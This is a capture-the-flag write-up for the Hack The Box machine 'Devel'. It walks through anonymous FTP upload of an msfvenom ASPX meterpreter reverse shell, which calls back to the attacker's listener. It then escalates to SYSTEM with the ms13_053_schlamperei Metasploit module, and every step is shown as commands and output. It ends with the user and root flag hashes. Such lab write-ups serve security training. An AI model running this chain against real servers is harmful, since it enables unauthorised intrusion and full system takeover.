# Devel
#### 10.10.10.5

```{r, engine='bash', count_lines}
nmap -sS -sV 10.10.10.5

Nmap scan report for 10.10.10.5
Host is up (0.21s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS httpd 7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.56 seconds
```


The website has a default IIS page.
Something seems fishy!


![Alt test](https://github.com/netcatus/HTB-Writeups/blob/master/Devel/images/IIS7.PNG "IIS7")



Lets check out ftp

```{r, engine='bash', count_lines}
root@kali:~/Hackthebox/Machines/Devel# ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> 
```
Anonymous login is allowed. 
Time to see whats inside
```{r, engine='bash', count_lines}
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```
Why does this have a welcome.png, is this the webservers root ?
Lets put something in the folder and check if we can browse it

We first create a testfile
```{r, engine='bash', count_lines}
root@kali:~/Hackthebox/Machines/Devel# touch test.txt
root@kali:~/Hackthebox/Machines/Devel# echo thisisatest > test.txt 
root@kali:~/Hackthebox/Machines/Devel# cat test.txt 
thisisatest
```

Then put it into the ftp
```{r, engine='bash', count_lines}
ftp> put test.txt
local: test.txt remote: test.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
13 bytes sent in 0.00 secs (634.7656 kB/s)
```

![Alt test](https://github.com/netcatus/HTB-Writeups/blob/master/Devel/images/testupload.PNG "testupload")

Voila! the file appears.

**Time for some shellz**

Was thinking of doing something with Insomnia shell but heck, metasploit is much easier
Create a reverse shell payload with msfvenom and upload it via the ftp

```{r, engine='bash', count_lines}
root@kali:~/Hackthebox/Machines/Devel# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.155 LPORT=4444 -f aspx > dotaplayer.aspx
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 333 bytes
Final size of aspx file: 2
Final size of aspx file: 2751 bytes

root@kali:~/Hackthebox/Machines/Devel# ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> put dotaplayer.aspx
local: dotaplayer.aspx remote: dotaplayer.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2787 bytes sent in 0.00 secs (8.7431 MB/s)
ftp> exit
221 Goodbye.
```

Start a listner in msf

We start msfconsole and use the multi/handler
```{r, engine='bash', count_lines}
msf > use exploit/multi/handler
```

We need to tell the handler what payload to use and what to listen on
```{r, engine='bash', count_lines}
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp

msf exploit(handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf exploit(handler) > set LHOST 10.10.15.155
LHOST => 10.10.15.155

[*] Exploit running as background job.

[*] Started reverse TCP handler on 10.10.15.155:4444 

```

We navigate to http://10.10.10.5/dotaplayer.aspx to spawn a reverse shell and this crops up on our terminal

![Alt test](https://github.com/netcatus/HTB-Writeups/blob/master/Devel/images/Spwaningmsfshell.PNG "spawnmsfshell")


```{r, engine='bash', count_lines}
[*] Sending stage (171583 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.15.155:4444 -> 10.10.10.5:49206) at 2017-10-15 09:53:30 +0530
[+] negotiating tlv encryption
[+] negotiated tlv encryption
[+] negotiated tlv encryption
```

We got **_shellz_**

Lets check out what we have
```{r, engine='bash', count_lines}
msf exploit(handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > 
```

We try and browse to the user directory for our flag and we get **Access Denied**
Looks like we need to escalate privs for the user.txt as well :(


**Priv Esc**


```{r, engine='bash', count_lines}
meterpreter > sysinfo
Computer        : DEVEL
OS              : Windows 7 (Build 7600).
Architecture    : x86
System Language : el_GR
Domain          : HTB
Logged On Users : 0
Meterpreter     : x86/windows
```

Our best bet is to go to the local exploit sugester (best = easier in this case) 

We start by putting the current meterpreter sessoin in the background and invoking the local exploit suggester module
```{r, engine='bash', count_lines}
msf exploit(handler) > use post/multi/recon/local_exploit_suggester 
msf post(local_exploit_suggester) > set SESSION 1
SESSION => 1
```

It has some juicy info for us
```{r, engine='bash', count_lines}
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```

We know what exploits are suggested, to make sure, lets see what Hotfixes are installed
```{r, engine='bash', count_lines}
C:\Users>systeminfo
systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                00392-918-5000002-85765
Original Install Date:     17/3/2017, 4:17:31 ��
System Boot Time:          18/10/2017, 7:17:57 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 6 Model 79 Stepping 1 GenuineIntel ~2100 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 5/4/2016
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     1.024 MB
Available Physical Memory: 763 MB
Virtual Memory: Max Size:  2.048 MB
Virtual Memory: Available: 1.573 MB
Virtual Memory: In Use:    475 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5
```

**Hotfix(s):                 N/A**

Lets get ready to rumble!!!

Select our exploit and set its options
**_NOTE_**: we need to change the port from 4444 to 4443
This is because our primary exploit(the dotaplayer.aspx reverse shell) is connected on port 4444
```{r, engine='bash', count_lines}
msf post(local_exploit_suggester) > use exploit/windows/local/ms13_053_schlamperei
msf exploit(ms13_053_schlamperei) > set SESSION 1
SESSION => 1
msf exploit(ms13_053_schlamperei) > set LPORT 4443
LPORT => 4443
msf exploit(ms13_053_schlamperei) > set LHOST 10.10.15.155
LHOST => 10.10.15.155
msf exploit(ms13_053_schlamperei) > show options

Module options (exploit/windows/local/ms13_053_schlamperei):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.15.155     yes       The listen address
   LPORT     4443             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 SP0/SP1
```

Time to **exploit** this female dog
```{r, engine='bash', count_lines}
msf exploit(ms13_053_schlamperei) > run

[*] Started reverse TCP handler on 10.10.15.155:4443 
[*] Launching notepad to host the exploit...
[+] Process 3052 launched.
[*] Reflectively injecting the exploit DLL into 3052...
[*] Injecting exploit into 3052...
[*] Found winlogon.exe with PID 424
[+] Everything seems to have worked, cross your fingers and wait for a SYSTEM shell
[*] Sending stage (171583 bytes) to 10.10.10.5
[*] Meterpreter session 2 opened (10.10.15.155:4443 -> 10.10.10.5:49211) at 2017-10-15 10:09:25 +0530
[+] negotiating tlv encryption

meterpreter > 

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```


**user.txt**
```
C:\Users\babis\Desktop>type user.txt.txt
type user.txt.txt
9ecdd6a3aedf24b41562fea70f4cb3e8
```


**root.txt**
```
C:\Users\Administrator\Desktop>type root.txt.txt
type root.txt.txt
e621a0b5041708797c4fc4728bc72b4b
```
